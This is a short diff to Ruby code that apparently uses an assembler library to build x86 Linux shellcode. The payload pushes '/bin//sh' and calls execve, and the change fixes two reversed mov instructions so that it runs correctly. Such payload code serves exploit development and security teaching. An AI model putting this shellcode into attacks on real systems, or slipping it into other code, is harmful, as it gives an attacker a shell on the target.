@@ -61,10 +61,10 @@ shellcode = ASM::Shellcode.new(arch: :x86) do
   push  eax
   push  0x68732f2f
   push  0x6e69622f
-  mov   esp,  ebx
+  mov   ebx,  esp
   push  eax
   push  ebx
-  mov   esp,  ecx
+  mov   ecx,  esp
   xor   edx,  edx
   mov   al,   0xb
   int   0x80
